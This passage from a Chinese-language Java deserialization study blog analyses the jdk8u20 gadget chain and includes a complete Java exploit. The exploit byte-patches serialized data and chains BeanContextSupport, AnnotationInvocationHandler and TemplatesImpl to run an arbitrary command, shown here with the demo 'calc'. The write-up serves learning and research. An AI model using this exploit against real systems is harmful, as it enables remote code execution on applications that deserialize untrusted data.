<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171647923.png" alt="image-20220217164738739"></p>
<p>可以看到除开类名称外的不同，重写 <code>writeObject</code> 的类在 <code>serialVersionUID</code> 后紧跟着的是 <code>03</code> ，而默认序列化的类跟着的是 <code>02</code> ，通过序列化常量的对比👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171648345.png" alt="image-20220217164851263"></p>
<p>显然 <code>03</code> 的值为 <code>SC_SERIALIZABLE | SC_WRITE_METHOD</code>， <code>02</code> 值为 <code>SC_SERIALIZABLE</code> 了。</p>
<p>同时重写 <code>writeObject</code> 的类比默认序列化的类多出一个 <code>78</code> 的字符，再查看序列化常量👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171651655.png" alt="image-20220217165133594"></p>
<p>可见多出的 <code>78</code>竟是 <code>TC_ENDBLOCKDATA</code> ，那么罪魁祸首也就找到了。</p>
<p>如果将这个 <code>78</code> 字符去掉，当 <code>BB</code> 类在调用自身的 <code>readObject</code> 方法时 <code>throw</code> 出错误且被 <code>try</code> 忽略了， <code>反序列化</code> 读取的指针位置的下一部分就不会是 <code>TC_ENDBLOCKDATA</code> ，而是接在后面的其他序列化内容了，最简单的方式比如直接将 <code>SC_SERIALIZABLE</code> 替换成 <code>SC_SERIALIZABLE | SC_WRITE_METHOD</code> 👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.HexBin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CC</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String s = <span class="string">&quot;c&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BB</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">65536L</span>;</span><br><span class="line">    <span class="keyword">public</span> String s = <span class="string">&quot;b&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream i)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        i.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;THROW&quot;</span>);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AA</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String s = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream o)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        o.defaultWriteObject();</span><br><span class="line">        o.writeObject(<span class="keyword">new</span> BB());</span><br><span class="line">        o.writeObject(<span class="keyword">new</span> CC());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream i)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        i.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 来自AA =&gt; writeObject(new BB())</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object o1 = i.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 来自AA =&gt; writeObject(new CC())</span></span><br><span class="line">        Object o2 = i.readObject();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            CC o22 = (CC) o2;</span><br><span class="line">            System.out.println(o22.s);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestClass2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(<span class="keyword">new</span> AA());</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] outBytes = HexBin.decode(HexBin.encode(barr.toByteArray()).replace(<span class="string">&quot;1000002&quot;</span>, <span class="string">&quot;1000003&quot;</span>));</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(outBytes));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>执行结果👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171659228.png" alt="image-20220217165903033"></p>
<p>此时成功地让 <code>AA</code> 类在 <code>反序列化</code> 时即便 <code>BB</code> 类出错了，但又能拿到属于自己写入的 <code>writeObject</code> 内容了。</p>
<p>那么再回过头来看 <code>BeanContextSupport</code> 类的 <code>readChildren</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171715668.png" alt="image-20220217171506583"></p>
<p>如果让 <code>serializable</code> 属性的值为 <code>2</code> ，然后构造好以下内容的 <code>writeObject</code> 👇</p>
<ul>
<li><code>AnnotationInvocationHand类</code></li>
<li><code>HashSet类</code><ul>
<li><code>HashSet.put([TemplatesImpl类()])</code></li>
<li><code>HashSet.put([AnnotationInvocationHand类()])</code></li>
</ul>
</li>
</ul>
<p>就可以先通过第一次循环将 <code>AnnotationInvocationHand</code> 类给 <code>readObject</code> ，并且忽略 <code>throw</code> 出的错误，再通过第二次循环调用 <code>HashSet</code> 类的 <code>readObject</code> 走 <code>jdk7u21</code> 链的 <code>payload</code> 了。</p>
<p>接着来看 <code>AnnotationInvocationHand</code> 类的 <code>writeObject</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171722802.png" alt="image-20220217172223715"></p>
<p>如果 <code>serializable &gt; 0 &amp;&amp; this.equals(getBeanContextPeer())</code> 成立则会调用 <code>writeChildren</code> 方法，其中 <code>serializable</code> 是可控且可序列化的👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171724943.png" alt="image-20220217172413869"></p>
<p>再跟进 <code>getBeanContextPeer</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171725643.png" alt="image-20220217172522599"></p>
<p>继续跟进 <code>getBeanContextChildPeer</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171725202.png" alt="image-20220217172547158"></p>
<p>可以看到最终值来自 <code>beanContextChildPeer</code> 属性，而这个 <code>beanContextChildPeer</code> 属性为 <code>BeanContextChildSupport</code> 类自身👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171727254.png" alt="image-20220217172728170"></p>
<p>并且 <code>BeanContextSupport</code> 类是继承了 <code>BeanContextChildSupport</code> 类的👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171728137.png" alt="image-20220217172834080"></p>
<p>因此这个 <code>this.equals(getBeanContextPeer())</code> 条件是必然成立的，跟进 <code>writeChildren</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171732030.png" alt="image-20220217173214858"></p>
<p>可见是将自身的 <code>children</code> 属性遍历一遍，如果键名的值是可序列化的则将键名的值和对应的值通过 <code>writeObject</code> 写入序列化数据中，同时写入的数量必须和 <code>serializable</code> 属性的值相等，否则会出错。</p>
<p>此时通过这个 <code>writeObject</code> 的方式，可知如果想在进行 <code>readObject</code> 时让 <code>AnnotationInvocationHand</code> 类紧接着 <code>HashSet</code> 类，就得将 <code>AnnotationInvocationHand</code> 作为键名，而 <code>HashSet</code> 作为对应的值。</p>
<p>但又因为 <code>serializable</code> 属性在 <code>反序列化</code> 时的期望值为 <code>2</code> ，而每个键值对只对应 <code>1</code> 的 <code>serializable</code> 值，否则会 <code>throw</code> 出错误，对此有两种解决方案👇</p>
<ul>
<li>用 <code>try</code> 忽略这个 <code>throw</code> 出的错误</li>
<li>再向 <code>children</code> 属性加入一个键值对，并确保这个多加的键值对在 <code>AnnotationInvocationHand</code> =&gt; <code>HashSet</code> 键值对之后(或是再另生成第二个<code>AnnotationInvocationHand</code> =&gt; <code>HashSet</code> 键值对)</li>
</ul>
<p>相比之下还是第一个方案较为简单些。</p>
<h3 id="payload-10"><a href="#payload-10" class="headerlink" title="- payload -"></a>- payload -</h3><p>按照上面的分析，理论上只需要改一个字节👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.HexBin;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.beans.beancontext.BeanContextSupport;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jdk8u20</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field f = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title">getTemplatesImpl</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        CtClass[] cs = <span class="keyword">new</span> CtClass[]&#123;</span><br><span class="line">                pool.makeClass(<span class="string">&quot;a&quot;</span> + System.nanoTime()),</span><br><span class="line">                pool.makeClass(<span class="string">&quot;b&quot;</span> + System.nanoTime())</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        cs[<span class="number">0</span>].makeClassInitializer().insertBefore(cmd);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[][] bc = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;</span><br><span class="line">                cs[<span class="number">0</span>].toBytecode(),</span><br><span class="line">                cs[<span class="number">1</span>].toBytecode()</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化templates并通过反射赋值</span></span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bc);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;dqv5&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_transletIndex&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates = getTemplatesImpl(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;).waitFor();&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class anClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor anCon = anClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        anCon.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// key(任意长度0字节都可)</span></span><br><span class="line">        String key = <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">char</span>[]&#123;<span class="number">0</span>&#125;);</span><br><span class="line"></span><br><span class="line">        HashMap anMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        anMap.put(key, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造AnnotationInvocationHandler代理</span></span><br><span class="line">        InvocationHandler anIn = (InvocationHandler) anCon.newInstance(Templates.class, anMap);</span><br><span class="line">        Map proxy = (Map) Proxy.newProxyInstance(anClass.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Map.class&#125;, anIn);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 包装(确保templates在proxy前面)</span></span><br><span class="line">        HashSet TriggerMap = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">        TriggerMap.add(templates);</span><br><span class="line">        TriggerMap.add(proxy);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造BeanContextSupport</span></span><br><span class="line">        BeanContextSupport bean = <span class="keyword">new</span> BeanContextSupport();</span><br><span class="line"></span><br><span class="line">        HashMap beanMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        beanMap.put(anIn, TriggerMap);</span><br><span class="line"></span><br><span class="line">        setFieldValue(bean, <span class="string">&quot;serializable&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        setFieldValue(bean, <span class="string">&quot;children&quot;</span>, beanMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 避免本地执行</span></span><br><span class="line">        anMap.put(key, templates);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化处理</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 规避 serializable != children.size 的 throw</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            oos.writeObject(bean);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 替换 AnnotationInvocationHandler 的 SC_SERIALIZABLE -&gt; SC_SERIALIZABLE | SC_WRITE_METHOD</span></span><br><span class="line">        <span class="comment">// 其中 55CAF50F15CB7EA5 为 AnnotationInvocationHandler 的 serialVersionUID</span></span><br><span class="line">        <span class="keyword">byte</span>[] outBytes = HexBin.decode(HexBin.encode(barr.toByteArray()).replace(<span class="string">&quot;55CAF50F15CB7EA502&quot;</span>, <span class="string">&quot;55CAF50F15CB7EA503&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(outBytes));</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>执行结果👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171751642.png" alt="image-20220217175149441"></p>
<p>是成功了。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="- 总结 -"></a>- 总结 -</h2><p>通过这几天的学习，发现在 <code>java</code> 中真是条条道路通罗马，每条链都有不少的其他衍生链可以借鉴(太卷了，555 )。无论如何，继续向前吧。</p>


        <hr>
        <!-- Pager -->
        <ul class="pager">
          
          <li class="previous">
            <a href="/posts/82715091/" data-toggle="tooltip" data-placement="top" title="学习笔记 - java-web学习(一)">&larr; Previous Post</a>
          </li>
          
          
          <li class="next">
            <a href="/posts/2586386993/" data-toggle="tooltip" data-placement="top" title="总结 - ctf中php的phar(一)">Next Post &rarr;</a>
          </li>
          
        </ul>

        
        <!-- tip start -->
        <!-- tip -->
<!-- tip start -->
<div class="tip">
  <p>
    
      如果您喜欢此博客或发现它对您有用，则欢迎对此发表评论。也欢迎您共享此博客，以便更多人可以参与。如果博客中使用的图像侵犯了您的版权，请与作者联系以将其删除。谢谢 ！
    
  </p>
</div>
<!-- tip end -->

        <!-- tip end -->
        

        
        <!-- Sharing Srtart -->
        <!-- Social Social Share Post -->
<!-- Docs:https://github.com/overtrue/share.js -->

<div class="social-share" data-initialized="true" data-disabled="tencent ,douban ,qzone ,linkedin ,facebook ,google ,diandian" data-wechat-qrcode-helper="" align="center">
  <ul class="list-inline text-center social-share-ul">
    <li class="social-share-li">
      <a target="_blank" class="social-share-icon icon-twitter">
        <i class="fa fa-twitter fa-1x" aria-hidden="true"></i>
      </a>
    </li>
    <li class="social-share-li">
      <a class="social-share-icon icon-wechat">
        <i class="fa fa-weixin fa-1x" aria-hidden="true"></i>
      </a>
    </li>
    <li class="social-share-li">
      <a target="_blank" class="social-share-icon icon-weibo">
        <i class="fa fa-weibo fa-1x" aria-hidden="true"></i>
      </a>
    </li>
    <li class="social-share-li">
      <a target="_blank" class="social-share-icon icon-qq">
        <i class="fa fa-qq fa-1x" aria-hidden="true"></i>
      </a>
    </li>
    <li class="social-share-li">
      <a target="_blank" class="social-share-icon" href="mailto:?subject=学习笔记 - java反序列化(一)&body=Hi,I found this website and thought you might like it https://morblog.cc/posts/320531414/">
        <i class="fa fa-envelope fa-1x" aria-hidden="true"></i>
      </a>
    </li>
  </ul>
</div>

<!-- css & js -->
<!-- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css"> -->
<script defer="defer" async="true" src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>

        <!-- Sharing End -->
        
        <hr>

        <!-- comments start -->
        <!-- 1. gitalk comment -->


<!-- 2. gitment comment -->


<!-- 4. disqus comment -->

  <!-- disqus comment start -->

  <div class="comment">
    <div id="disqus_thread" class="disqus-thread"></div>
  </div>

  <!-- disqus embedded js code start (one page only need to embed once) -->
  <script type="text/javascript">
    /* * * CONFIGURATION VARIABLES * * */
    var disqus_shortname = "moryyds-1";
    var disqus_identifier = "https://morblog.cc/posts/320531414/";
    var disqus_url = "https://morblog.cc/posts/320531414/";

    (function () {
      var dsq = document.createElement('script');
      dsq.type = 'text/javascript';
      dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
  </script>
  <!-- disqus embedded js code start end -->

  <!-- disqus comment end -->


        <!-- comments end -->
        <hr>

      </div>

      <!-- Catalog: Tabe of Content -->
      <!-- Table of Contents -->

    
      <aside id="sidebar">
        <div id="toc" class="toc-article">
        <strong class="toc-title">目录</strong>
        
          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%B8%80"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">学习笔记 - java反序列化(一)</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">- 前言 -</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%89%8D%E7%BD%AE%E5%86%85%E5%AE%B9"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">- 前置内容 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Transformer"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">- Transformer -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90"><span class="toc-nav-number">1.2.1.1.</span> <span class="toc-nav-text">- 分析 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#InvokerTransformer"><span class="toc-nav-number">1.2.1.1.1.</span> <span class="toc-nav-text">- InvokerTransformer -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#ConstantTransformer"><span class="toc-nav-number">1.2.1.1.2.</span> <span class="toc-nav-text">- ConstantTransformer -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#ChainedTransformer"><span class="toc-nav-number">1.2.1.1.3.</span> <span class="toc-nav-text">- ChainedTransformer -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#payload"><span class="toc-nav-number">1.2.1.2.</span> <span class="toc-nav-text">- payload -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#TemplatesImpl"><span class="toc-nav-number">1.2.2.</span> <span class="toc-nav-text">- TemplatesImpl -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-nav-number">1.2.2.1.</span> <span class="toc-nav-text">- 分析 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#payload-1"><span class="toc-nav-number">1.2.2.2.</span> <span class="toc-nav-text">- payload -</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#CC%E9%93%BE"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">- CC链 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#CC1"><span class="toc-nav-number">1.3.1.</span> <span class="toc-nav-text">- CC1 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%B0%83%E7%94%A8%E7%BB%93%E6%9E%84"><span class="toc-nav-number">1.3.1.1.</span> <span class="toc-nav-text">- 调用结构 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90-2"><span class="toc-nav-number">1.3.1.2.</span> <span class="toc-nav-text">- 分析 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#payload-2"><span class="toc-nav-number">1.3.1.3.</span> <span class="toc-nav-text">- payload -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%89%A9%E5%B1%95"><span class="toc-nav-number">1.3.1.4.</span> <span class="toc-nav-text">- 扩展 -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#CC2"><span class="toc-nav-number">1.3.2.</span> <span class="toc-nav-text">- CC2 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%B0%83%E7%94%A8%E7%BB%93%E6%9E%84-1"><span class="toc-nav-number">1.3.2.1.</span> <span class="toc-nav-text">- 调用结构 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90-3"><span class="toc-nav-number">1.3.2.2.</span> <span class="toc-nav-text">- 分析 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#payload-3"><span class="toc-nav-number">1.3.2.3.</span> <span class="toc-nav-text">- payload -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#CC3"><span class="toc-nav-number">1.3.3.</span> <span class="toc-nav-text">- CC3 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%B0%83%E7%94%A8%E7%BB%93%E6%9E%84-2"><span 